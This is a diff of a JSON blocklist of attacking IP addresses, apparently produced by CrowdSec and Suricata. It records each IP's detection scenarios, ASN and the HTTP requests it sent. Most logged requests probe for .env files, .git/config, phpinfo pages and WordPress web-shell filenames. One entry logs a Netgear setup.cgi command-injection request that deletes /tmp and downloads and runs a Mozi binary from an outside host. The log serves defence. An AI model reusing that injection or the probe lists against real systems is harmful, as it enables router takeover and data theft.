@@ -1,7 +1,7 @@
 {
   "schema_version": "2",
   "ttl_days": 7,
-  "updated_at": "2026-09-18T01:00:09.196674Z",
+  "updated_at": "2026-09-18T13:00:07.974389Z",
   "items": {
     "202.163.102.169": {
       "ip": "202.163.102.169",
@@ -385,90 +385,6 @@
       },
       "asn": "14061",
       "asn_prefix": "161.35.176.0/20"
-    },
-    "34.6.225.30": {
-      "ip": "34.6.225.30",
-      "family": "v4",
-      "first_seen": "2026-09-11T09:30:49Z",
-      "last_seen": "2026-09-11T09:30:55Z",
-      "scenarios": {
-        "crowdsec/http-crawl-non_statics": {
-          "count": 1,
-          "last_seen": "2026-09-11T09:30:55Z"
-        },
-        "crowdsec/http-technology-probing": {
-          "count": 1,
-          "last_seen": "2026-09-11T09:30:54Z"
-        },
-        "crowdsec/http-admin-interface-probing": {
-          "count": 1,
-          "last_seen": "2026-09-11T09:30:52Z"
-        },
-        "crowdsec/http-probing": {
-          "count": 1,
-          "last_seen": "2026-09-11T09:30:49Z"
-        },
-        "crowdsec/http-sensitive-files": {
-          "count": 1,
-          "last_seen": "2026-09-11T09:30:49Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 5,
-          "first_seen": "2026-09-11T09:30:49Z",
-          "last_seen": "2026-09-11T09:30:55Z",
-          "payloads": [
-            "GET /server-info.php",
-            "GET /server-status.php",
-            "GET /_environment",
-            "GET /phpinfo.php.bak",
-            "GET /phpinfo.php.old",
-            "GET /info.php",
-            "GET /admin/.env",
-            "GET /admin-panel/.env",
-            "GET /administrator/.env",
-            "GET /",
-            "GET /.git/config",
-            "GET /.env",
-            "GET /.env.local",
-            "GET /.env.production",
-            "GET /.env.staging",
-            "GET /.env.development",
-            "GET /.env.test",
-            "GET /.env.remote",
-            "GET /.env.bak",
-            "GET /.env.backup"
-          ]
-        }
-      },
-      "asn": "396982",
-      "asn_prefix": "34.6.0.0/16"
-    },
-    "46.105.38.210": {
-      "ip": "46.105.38.210",
-      "family": "v4",
-      "first_seen": "2026-09-11T07:46:15Z",
-      "last_seen": "2026-09-11T07:46:15Z",
-      "scenarios": {
-        "crowdsec/http-bad-user-agent": {
-          "count": 1,
-          "last_seen": "2026-09-11T07:46:15Z"
-        }
-      },
-      "sources": {
-        "crowdsec": {
-          "count": 1,
-          "first_seen": "2026-09-11T07:46:15Z",
-          "last_seen": "2026-09-11T07:46:15Z",
-          "payloads": [
-            "GET /robots.txt",
-            "GET /"
-          ]
-        }
-      },
-      "asn": "16276",
-      "asn_prefix": "46.105.0.0/16"
     },
     "102.212.40.238": {
       "ip": "102.212.40.238",
@@ -3231,36 +3147,27 @@
       "ip": "52.141.45.117",
       "family": "v4",
       "first_seen": "2026-09-16T17:42:52Z",
-      "last_seen": "2026-09-16T17:43:21Z",
+      "last_seen": "2026-09-18T04:09:08Z",
       "scenarios": {
         "crowdsec/http-wordpress-scan": {
           "count": 1,
           "last_seen": "2026-09-16T17:43:21Z"
         },
         "crowdsec/http-admin-interface-probing": {
-          "count": 1,
-          "last_seen": "2026-09-16T17:43:21Z"
+          "count": 2,
+          "last_seen": "2026-09-18T04:09:08Z"
         },
         "crowdsec/http-probing": {
-          "count": 1,
-          "last_seen": "2026-09-16T17:42:52Z"
+          "count": 2,
+          "last_seen": "2026-09-18T04:08:54Z"
         }
       },
       "sources": {
         "crowdsec": {
-          "count": 3,
+          "count": 5,
           "first_seen": "2026-09-16T17:42:52Z",
-          "last_seen": "2026-09-16T17:43:21Z",
+          "last_seen": "2026-09-18T04:09:08Z",
           "payloads": [
-            "GET /wp-content/index.php",
-            "GET /wp-includes/ID3/about.php",
-            "GET /wp-admin/js/index.php",
-            "GET /wp-content/admin.php",
-            "GET /admin.php?",
-            "GET /wp-admin/css/colors/modern/",
-            "GET /wp-content/plugins/hellopress/wp_filemanager.php",
-            "GET /this_is_a_new_hello_world.php",
-            "GET /jp.php",
             "GET /01.php",
             "GET /wp-filemannger.php",
             "GET /ba.php?p=",
@@ -3268,7 +3175,19 @@
             "GET /dyt8mjxc3yofbkoriukvgjaCdefault.php",
             "GET /robots.php",
             "GET /k.php",
-            "GET /w.php"
+            "GET /w.php",
+            "GET /wp-admin/css/",
+            "GET /admin.php",
+            "GET /admin.php?attempt=1",
+            "GET /alfa.php",
+            "GET /222.php",
+            "GET /3PJcpMFsD8B.php",
+            "GET /images.php",
+            "GET /goods.php",
+            "GET /k.php?p=",
+            "GET /media.php",
+            "GET /mac.php",
+            "GET /test1.php"
           ]
         }
       },
@@ -30375,6 +30294,265 @@
       },
       "asn": "14061",
       "asn_prefix": "164.92.128.0/20"
+    },
+    "103.116.137.186": {
+      "ip": "103.116.137.186",
+      "family": "v4",
+      "first_seen": "2026-09-18T10:49:11Z",
+      "last_seen": "2026-09-18T10:49:12Z",
+      "scenarios": {
+        "crowdsec/netgear_rce": {
+          "count": 1,
+          "last_seen": "2026-09-18T10:49:11Z"
+        },
+        "crowdsec/http-cve-probing": {
+          "count": 1,
+          "last_seen": "2026-09-18T10:49:11Z"
+        },
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt": {
+          "count": 1,
+          "last_seen": "2026-09-18T10:49:12Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 2,
+          "first_seen": "2026-09-18T10:49:11Z",
+          "last_seen": "2026-09-18T10:49:11Z",
+          "payloads": [
+            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
+          ]
+        },
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-09-18T10:49:12Z",
+          "last_seen": "2026-09-18T10:49:12Z",
+          "sids": [
+            44687
+          ],
+          "max_priority": 1,
+          "payloads": [
+            "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+          ]
+        }
+      },
+      "asn": "134922",
+      "asn_prefix": "103.116.136.0/23"
+    },
+    "34.6.167.89": {
+      "ip": "34.6.167.89",
+      "family": "v4",
+      "first_seen": "2026-09-18T06:01:13Z",
+      "last_seen": "2026-09-18T07:49:01Z",
+      "scenarios": {
+        "crowdsec/http-technology-probing": {
+          "count": 2,
+          "last_seen": "2026-09-18T07:49:01Z"
+        },
+        "crowdsec/http-admin-interface-probing": {
+          "count": 2,
+          "last_seen": "2026-09-18T07:48:56Z"
+        },
+        "crowdsec/http-probing": {
+          "count": 2,
+          "last_seen": "2026-09-18T07:48:48Z"
+        },
+        "crowdsec/http-sensitive-files": {
+          "count": 2,
+          "last_seen": "2026-09-18T07:48:48Z"
+        },
+        "crowdsec/http-crawl-non_statics": {
+          "count": 1,
+          "last_seen": "2026-09-18T06:01:22Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 9,
+          "first_seen": "2026-09-18T06:01:13Z",
+          "last_seen": "2026-09-18T07:49:01Z",
+          "payloads": [
+            "GET /administrator/.env",
+            "GET /",
+            "GET /.git/config",
+            "GET /.env",
+            "GET /.env.local",
+            "GET /.env.production",
+            "GET /.env.staging",
+            "GET /.env.development",
+            "GET /.env.test",
+            "GET /.env.remote",
+            "GET /.env.bak",
+            "GET /.env.backup",
+            "GET /_environment",
+            "GET /phpinfo.php.bak",
+            "GET /phpinfo.php.old",
+            "GET /phpinfo.php~",
+            "GET /info.php.bak",
+            "GET /phpinfo.php.save",
+            "GET /info.php",
+            "GET /admin/.env"
+          ]
+        }
+      },
+      "asn": "396982",
+      "asn_prefix": "34.6.0.0/16"
+    },
+    "199.45.154.71": {
+      "ip": "199.45.154.71",
+      "family": "v4",
+      "first_seen": "2026-09-18T05:45:08Z",
+      "last_seen": "2026-09-18T05:45:08Z",
+      "scenarios": {
+        "crowdsec/http-bad-user-agent": {
+          "count": 1,
+          "last_seen": "2026-09-18T05:45:08Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-09-18T05:45:08Z",
+          "last_seen": "2026-09-18T05:45:08Z",
+          "payloads": [
+            "GET /",
+            "GET /debug/pprof/"
+          ]
+        }
+      },
+      "asn": "398722",
+      "asn_prefix": "199.45.154.0/24"
+    },
+    "66.132.224.227": {
+      "ip": "66.132.224.227",
+      "family": "v4",
+      "first_seen": "2026-09-18T01:37:56Z",
+      "last_seen": "2026-09-18T01:37:56Z",
+      "scenarios": {
+        "crowdsec/http-bad-user-agent": {
+          "count": 1,
+          "last_seen": "2026-09-18T01:37:56Z"
+        }
+      },
+      "sources": {
+        "crowdsec": {
+          "count": 1,
+          "first_seen": "2026-09-18T01:37:56Z",
+          "last_seen": "2026-09-18T01:37:56Z",
+          "payloads": [
+            "GET /debug/pprof/",
+            "GET /sitemap.xml"
+          ]
+        }
+      },
+      "asn": "398324",
+      "asn_prefix": "66.132.224.0/24"
+    },
+    "93.152.221.108": {
+      "ip": "93.152.221.108",
+      "family": "v4",
+      "first_seen": "2026-09-18T04:55:20Z",
+      "last_seen": "2026-09-18T04:55:20Z",
+      "scenarios": {
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 21": {
+          "count": 1,
+          "last_seen": "2026-09-18T04:55:20Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-09-18T04:55:20Z",
+          "last_seen": "2026-09-18T04:55:20Z",
+          "sids": [
+            2500040
+          ],
+          "max_priority": 2
+        }
+      },
+      "asn": "197170",
+      "asn_prefix": "93.152.221.0/24"
+    },
+    "101.87.60.22": {
+      "ip": "101.87.60.22",
+      "family": "v4",
+      "first_seen": "2026-09-18T01:19:14Z",
+      "last_seen": "2026-09-18T01:19:14Z",
+      "scenarios": {
+        "suricata/ET WEB_SERVER WGET Command Specifying Output in HTTP Headers": {
+          "count": 1,
+          "last_seen": "2026-09-18T01:19:14Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-09-18T01:19:14Z",
+          "last_seen": "2026-09-18T01:19:14Z",
+          "sids": [
+            2019309
+          ],
+          "max_priority": 1,
+          "payloads": [
+            "POST /HNAP1/"
+          ]
+        }
+      },
+      "asn": "4812",
+      "asn_prefix": "101.87.0.0/16"
+    },
+    "40.80.200.70": {
+      "ip": "40.80.200.70",
+      "family": "v4",
+      "first_seen": "2026-09-18T01:14:22Z",
+      "last_seen": "2026-09-18T01:14:22Z",
+      "scenarios": {
+        "suricata/ET SCAN Zmap User-Agent (Inbound)": {
+          "count": 1,
+          "last_seen": "2026-09-18T01:14:22Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-09-18T01:14:22Z",
+          "last_seen": "2026-09-18T01:14:22Z",
+          "sids": [
+            2029054
+          ],
+          "max_priority": 3,
+          "payloads": [
+            "GET /druid/index.html"
+          ]
+        }
+      },
+      "asn": "8075",
+      "asn_prefix": "40.80.0.0/12"
+    },
+    "107.150.97.10": {
+      "ip": "107.150.97.10",
+      "family": "v4",
+      "first_seen": "2026-09-18T11:45:53Z",
+      "last_seen": "2026-09-18T11:45:53Z",
+      "scenarios": {
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 3": {
+          "count": 1,
+          "last_seen": "2026-09-18T11:45:53Z"
+        }
+      },
+      "sources": {
+        "suricata": {
+          "count": 1,
+          "first_seen": "2026-09-18T11:45:53Z",
+          "last_seen": "2026-09-18T11:45:53Z",
+          "sids": [
+            2500004
+          ],
+          "max_priority": 2
+        }
+      },
+      "asn": "135377",
+      "asn_prefix": "107.150.96.0/21"
     }
   },
   "asn_names": {
@@ -30663,6 +30841,8 @@
     "9829": "BSNL-NIB - National Internet Backbone",
     "9873": "TELECOM-LA-AS-AP - Lao Telecom Communication, LTC",
     "9931": "NTPCL-AS-AP - National Telecom Public Company Limited",
-    "9988": "MPT-AP - Myanma Posts and Telecommunications"
+    "9988": "MPT-AP - Myanma Posts and Telecommunications",
+    "134922": "RGTECHNOSOLUTIONS-AS - R G TECHNOSOLUTIONS PVT LTD",
+    "4812": "CHINANET-SH-AP - China Telecom (Group)"
   }
 }
